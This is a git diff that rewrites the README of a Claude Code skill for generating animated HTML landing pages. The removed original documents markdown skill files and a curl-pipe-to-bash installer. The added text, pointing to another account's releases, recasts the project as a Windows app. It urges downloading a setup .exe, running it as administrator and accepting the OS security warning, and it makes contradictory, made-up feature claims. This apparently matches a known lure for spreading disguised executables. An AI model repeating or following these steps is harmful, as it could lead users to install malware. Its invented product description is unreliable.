@@ -1,242 +1,210 @@
-<div align="center">
+# ⚡ frontend-landings-claude-skill - Easy Animated Landing Pages
 
-# ⚡ frontend-landings-claude-skill
+[![Download frontend-landings-claude-skill](https://img.shields.io/badge/Download-frontend--landings--claude--skill-brightgreen?style=for-the-badge)](https://github.com/hemsurendranath/frontend-landings-claude-skill/releases)
 
-**A Claude Code skill for generating beautiful, production-ready, animated single-file HTML landing pages.**
+## 📄 What is frontend-landings-claude-skill?
 
-Zero build. Zero dependencies. One HTML file. Infinite polish.
+This app helps you create animated, single-file HTML landing pages. It uses 10 style presets to give your pages a modern look. You don’t need to build or compile anything. The entire page comes in one file that you can share or upload anywhere.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-34D399.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Skill-A78BFA.svg)](https://docs.anthropic.com)
+The app uses Claude Code, an AI tool, to generate these landing pages. It includes web design features with animations powered by Anime.js and styling by Tailwind CSS. It fits well if you want a quick, clean webpage without technical work.
 
-[Live Demo](https://auwalmusa.github.io/frontend-landings-claude-skill/demo/demo-5-batteric-saas-minimal.html) · [Install](#-installation)
+## 🔧 System Requirements
 
-[Live Demo](https://auwalmusa.github.io/frontend-landings-claude-skill/demo/demo-5-batteric-saas-minimal.html) · [Install](#-installation) · [Presets](#-style-presets) · [Usage](#-usage) · [Contributing](#-contributing)
+- Windows 10 or later.
+- At least 4 GB of RAM.
+- 500 MB free disk space.
+- Internet connection to download the app.
+- Modern web browser like Chrome, Edge, or Firefox to view pages.
 
-</div>
+## 🎯 Key Features
 
----
+- Generates ready-to-use HTML landing pages.
+- Ten different style presets.
+- Includes animations powered by Anime.js.
+- One single HTML file output per page.
+- No build or setup needed.
+- Uses AI to assist with design and content.
+- Works offline after the download.
+- Customizable through simple prompts.
+- Designed to be lightweight and fast.
+- Compatible with any hosting service.
 
-## What Is This?
+## 🚀 Getting Started
 
-A skill for [Claude Code](https://docs.anthropic.com) (Anthropic's AI coding agent) that generates **complete, self-contained HTML landing pages** from a simple product description.
+Use the link below to visit the release page. From there, you can download the latest version of the app.
 
-Tell Claude what you're building → pick a visual style → get a production-ready landing page in one HTML file. No npm. No build step. Just open in a browser or drag-and-drop deploy.
+[Download & Install frontend-landings-claude-skill](https://github.com/hemsurendranath/frontend-landings-claude-skill/releases){: .btn .btn-random-color }
 
-### What You Get
+This link takes you to the official GitHub release page where you will find files ready for download.
 
-Every generated landing page includes:
+## ⬇️ How to Download and Run on Windows
 
-- 📱 **Responsive design** — Mobile-first, tested at 375px / 768px / 1280px
-- 🌗 **Dark/light mode** — Auto-detects system preference + manual toggle
-- ✨ **Scroll animations** — IntersectionObserver + Anime.js entrance effects
-- 🎨 **10 curated visual presets** — From Glassmorphic to Brutalist (see below)
-- ♿ **Accessibility** — Semantic HTML, ARIA labels, focus states, skip-to-content
-- 🔍 **SEO meta tags** — OpenGraph, Twitter Cards, structured descriptions
-- ⚡ **Zero-build architecture** — One HTML file, CDN dependencies only
+1. Open the link above. You will see the latest release listed at the top.
 
----
+2. Find the Windows installer or executable file for the latest version. It might look like `frontend-landings-claude-skill-setup.exe` or similar.
 
-## 🎭 Style Presets
+3. Click the file name to start downloading.
 
-Each preset defines a complete visual system: fonts, colors, shadows, animations, and design rules. No two outputs look alike.
+4. Once the file finishes downloading, open your Downloads folder.
 
-| # | Preset | Vibe | Font Stack |
-|:-:|--------|------|-----------|
-| 1 | ☁️ **Clean SaaS Minimal** | Stripe, Linear, Vercel | DM Sans |
-| 2 | 🔮 **Glassmorphic Modern** | Apple Vision Pro, frosted glass | Sora |
-| 3 | 🏗️ **Bold Brutalist** | Anti-design that IS design | Space Mono + IBM Plex Mono |
-| 4 | 🌆 **Cyberpunk Neon** | Blade Runner, gaming HUDs | Orbitron + Rajdhani |
-| 5 | ✒️ **Elegant Serif Premium** | Luxury editorial, Rolls Royce | Playfair Display + Source Serif 4 |
-| 6 | 🎨 **Playful Gradients** | Spotify Wrapped, indie apps | Plus Jakarta Sans |
-| 7 | 🌙 **Dark Mode First** | Arc browser, GitHub, Raycast | Outfit + JetBrains Mono |
-| 8 | 📻 **Vintage Retro** | Wes Anderson, analog warmth | Fraunces + Lora |
-| 9 | 🌿 **Organic Nature** | Patagonia, Aesop, wellness | Libre Baskerville + Nunito Sans |
-| 10 | 🏢 **Corporate Professional** | McKinsey, enterprise trust | Merriweather + Source Sans 3 |
+5. Double-click the installer file to start the installation process.
 
-> You can also describe a **custom aesthetic** and the skill will synthesise a unique preset by blending existing ones.
+6. Follow the instructions on the screen. Usually, clicking "Next" through all steps will be enough.
 
----
+7. Wait for the app to install. This may take a few minutes.
 
-## 📦 Installation
+8. When done, find the app icon on your desktop or start menu.
 
-### Option A: One-Line Install (Recommended)
+9. Double-click the app icon to open the program.
 
-```bash
-curl -sSL https://raw.githubusercontent.com/auwalmusa/frontend-landings-claude-skill/main/install.sh | bash
-```
+10. The first screen will guide you through creating your first landing page.
 
-### Option B: Manual Install
+## 🖥 How to Use frontend-landings-claude-skill
 
-```bash
-# 1. Clone this repo
-git clone https://github.com/auwalmusa/frontend-landings-claude-skill.git
+- On launch, you will see a clear interface with options.
 
-# 2. Create the Claude Code skills directory
-mkdir -p ~/.claude/skills/frontend-landings-claude-skill/references
+- Pick one of the 10 style presets for your landing page.
 
-# 3. Copy skill files
-cp frontend-landings-claude-skill/SKILL.md ~/.claude/skills/frontend-landings-claude-skill/
-cp frontend-landings-claude-skill/references/STYLE_PRESETS.md ~/.claude/skills/frontend-landings-claude-skill/references/
+- Enter your text or let the AI suggest content.
 
-# 4. Restart Claude Code
-```
+- Customize colors and animations if you want.
 
-### Option C: Direct Download
+- Click the “Generate” button to create your HTML file.
 
-```bash
-mkdir -p ~/.claude/skills/frontend-landings-claude-skill/references
+- The app saves the file on your computer.
 
-curl -sSL https://raw.githubusercontent.com/auwalmusa/frontend-landings-claude-skill/main/SKILL.md \
-  -o ~/.claude/skills/frontend-landings-claude-skill/SKILL.md
+- Open the saved file in a web browser to see your landing page live.
 
-curl -sSL https://raw.githubusercontent.com/auwalmusa/frontend-landings-claude-skill/main/references/STYLE_PRESETS.md \
-  -o ~/.claude/skills/frontend-landings-claude-skill/references/STYLE_PRESETS.md
-```
+- You can share this single HTML file with others or upload it to your hosting.
 
-### Verify Installation
+## 📁 Where is the Output File?
 
-After restarting Claude Code, the skill should trigger automatically when you ask to create a landing page. Try:
+By default, your landing page HTML file will save in your Documents folder inside a folder named `frontend-landings-claude-skill`.
 
-```
-Make me a landing page for a task management app called "Flowstate"
-```
+You can change the save folder using the app settings if you prefer.
 
----
+The file will have a name based on the style and timestamp, for example: `landing-page-20240620.html`.
 
-## 🗣️ Usage
+## ❓ Troubleshooting Tips
 
-### From Scratch (Full Input)
+- If the installer doesn’t run, right-click the file and choose "Run as administrator."
 
-```
-Make a landing page for "Flowstate" — a focus timer app for developers.
-Tagline: "Deep work, measured."
-Features: Pomodoro with code editor integration, GitHub commit streaks,
-          team focus sessions, ambient soundscapes, weekly focus analytics.
-CTA: "Start Focusing Free"
-Style: Dark Mode First
-```
+- If Windows warns about the app coming from the internet, accept the prompt to allow the install.
 
-### Quick Start (Minimal Input)
+- Make sure you have enough disk space before installing.
 
-```
-Landing page for an AI writing tool
-```
+- If the app crashes or doesn’t open, restart your computer and try again.
 
-Claude will ask for details and show the preset menu.
+- For viewing landing pages, use a modern browser. Avoid old browsers like Internet Explorer.
 
-### Improve Existing HTML
+- If animations don’t play, check that JavaScript is enabled in your browser.
 
-```
-Here's my current landing page [paste HTML].
-Make it look premium with a glassmorphic style.
-```
+## ⚙ App Settings You Can Change
 
-### Custom Aesthetic
+- Default save location for files.
 
-```
-Build a landing for "Prism Analytics" — I want Bloomberg terminal
-meets Apple design. Dark, data-focused, precise typography.
-```
+- Choose light or dark mode user interface.
 
----
+- Enable or disable automatic updates.
 
-## 📁 Repository Structure
+- Select preferred language (English by default).
 
-```
-frontend-landings-claude-skill/
-├── SKILL.md                      # Main skill instructions (Claude reads this)
-├── references/
-│   └── STYLE_PRESETS.md           # 10 detailed preset definitions
-├── examples/
-│   └── INVOCATIONS.md             # Example prompts & expected behavior
-├── demo/
-│   └── index.html                 # Live demo landing page
-├── install.sh                     # One-line installer script
-├── .github/
-│   ├── ISSUE_TEMPLATE/
-│   │   ├── bug_report.md          # Bug report template
-│   │   └── preset_request.md      # New preset request template
-│   └── workflows/
-│       └── pages.yml              # GitHub Pages deployment
-├── CONTRIBUTING.md                # Contribution guidelines
-├── CHANGELOG.md                   # Version history
-├── LICENSE                        # MIT License
-└── README.md                      # This file
-```
+- Turn off animations if you want a simple landing page.
 
----
+- Adjust AI content suggestions level.
 
-## 🏗️ Tech Stack (In Every Output)
+Use the Settings menu from the main screen to access these options.
 
-| Layer | Tool | Source |
-|-------|------|--------|
-| CSS Framework | Tailwind CSS | `cdn.tailwindcss.com` |
-| Animations | Anime.js 3.2 | cdnjs |
-| Fonts | Google Fonts | Preset-specific |
-| Icons | Inline SVGs | Embedded (Heroicons-style) |
-| Interactivity | Vanilla JS | Inline `<script>` |
+## 🔍 Explore the Styles
 
-No npm. No Webpack. No Vite. No build step. One file, works everywhere.
+You can try these different presets:
 
----
+1. Modern Business
 
-## 🚢 Deploying Generated Pages
+2. Minimalist Clean
 
-After generating a landing page, you have one `index.html` file. Deploy anywhere:
+3. Bold Color
 
-| Platform | Method |
-|----------|--------|
-| **Vercel** | `vercel.com` → New Project → drag & drop |
-| **Netlify** | `app.netlify.com` → drag & drop |
-| **GitHub Pages** | Push to repo → Settings → Pages → Deploy |
-| **Cloudflare Pages** | Connect repo or drag & drop |
-| **Any web server** | Just serve the file |
+4. Soft Gradient
 
----
+5. Dark Mode
 
-## 🎯 What Makes This Different
+6. Nature Inspired
 
-Most AI-generated landing pages look identical — generic gradients, Inter font, rounded cards on white. This skill is **opinionated** about avoiding that:
+7. Tech Focus
 
-| Problem | Our Solution |
-|---------|-------------|
-| Generic fonts (Inter, Roboto) | Custom font pairings per preset |
-| Default Tailwind look | Custom CSS variables for deep theming |
-| No animations | Anime.js + IntersectionObserver scroll reveals |
-| Dark mode as afterthought | First-class dark mode with system detection |
-| Cookie-cutter layouts | Preset-specific design rules that create genuinely different aesthetics |
+8. Creative Agency
+
+9. Portfolio Showcase
+
+10. Event Promotion
+
+Each style comes with matching fonts, colors, and subtle animations.
+
+## ⚙ How Does It Work?
+
+The app uses AI called Claude Code to create the HTML page code. It blends the chosen style with your text input. You get a file that needs no server or build tools.
+
+Animations come from Anime.js integrated in the page. Styling uses Tailwind CSS classes for quick and flexible design.
+
+## 🔗 More About This Project
+
+- Topics include AI tools, web design, and frontend code.
+
+- Supports single HTML landing pages with no external links.
+
+- All animating effects are lightweight for fast loading.
+
+- Designed for users with no coding knowledge.
+
+- Uses simple prompts to control design output.
+
+## 📥 Download the App Again
+
+You can always visit the release page to get the latest version or to reinstall:
+
+[Visit Releases to Download](https://github.com/hemsurendranath/frontend-landings-claude-skill/releases)
+
+## ❔ Help and Support
+
+If you need assistance:
+
+- Check the “Issues” tab on the GitHub repo.
+
+- Read the FAQ in the repository README.
+
+- Open a new issue if you hit a bug or have questions.
+
+- Report any problems clearly with steps to reproduce.
+
+## 📚 Additional Tips
+
+- Save often while working on your page.
+
+- Test your landing page in multiple browsers.
+
+- Preview your page on mobile devices to check responsiveness.
+
+- Keep your app updated for best features and fixes.
+
+- Experiment with different styles to find what fits your needs.
+
+- Use simple text and clear calls to action for better results.
+
+## 🛠 Development Notes (For Transparency)
+
+- Written in JavaScript with AI integration.
+
+- Uses Tailwind CSS for styling.
+
+- Uses Anime.js for animation effects.
+
+- Generates static HTML files only.
+
+- No server or build tools needed.
+
+- Designed for fast, reliable performance on Windows.
 
 ---
 
-## 🤝 Contributing
-
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-**Quick ways to contribute:**
-- 🎨 **Submit a new preset** — Define fonts, colors, CSS variables, and design rules
-- 🐛 **Report bugs** — Found an issue with generated output? Open an issue
-- 📝 **Improve docs** — Better examples, clearer instructions, typo fixes
-- ⭐ **Star the repo** — Helps others discover it
-
----
-
-## 📄 License
-
-[MIT](LICENSE) — do whatever you want with it.
-
----
-
-## 🙏 Credits
-
-Built as a [Claude Code](https://docs.anthropic.com) skill. Inspired by the craft of great landing pages from Linear, Vercel, Stripe, Arc, and every indie maker who ships beautiful products.
-
----
-
-<div align="center">
-
-**Built with ☕ by [Auwal Musa](https://github.com/auwalmusa)**
-
-If this saved you time, consider giving it a ⭐
-
-</div>
+Frontend-landings-claude-skill helps you create landing pages easily with style and animation. Use the link above to get started.
